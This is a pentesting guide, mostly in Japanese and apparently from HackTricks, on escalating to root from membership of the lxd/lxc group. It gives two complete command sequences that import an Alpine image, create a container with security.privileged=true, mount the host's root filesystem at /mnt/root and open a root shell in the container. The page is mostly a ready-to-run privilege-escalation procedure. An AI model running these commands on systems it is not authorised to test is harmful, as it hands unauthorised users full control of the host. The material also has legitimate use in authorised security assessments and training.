# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

_**lxd**_ **または** _**lxc**_ **group** に所属している場合、root になることができます

## インターネットを使用しない Exploiting

### Method 1

信頼できる repository から、lxd で使用する alpine image を download できます。  
Canonical は site で daily build を公開しています: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
最新の build から **lxd.tar.xz** と **rootfs.squashfs** の両方を取得してください。（Directory name は日付です）。

または、次の distro builder を machine に install できます: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder)（github の instructions に従ってください）：
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
**incus.tar.xz**（Canonical repositoryからdownloadした場合は**lxd.tar.xz**）と**rootfs.squashfs**をUploadし、imageをrepoに追加してcontainerを作成します：
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> このエラー _**Error: No storage pool found. Please create a new storage pool**_\
> **`lxd init`** を実行し、すべてのオプションでデフォルトを設定します。その後、前のコマンド群を**もう一度実行**します。

最後に、containerを実行してrootを取得できます：
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 方法 2

Alpine imageを buildし、`security.privileged=true` flagを使用して起動することで、containerがhost filesystemとrootとしてやり取りするよう強制します。
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
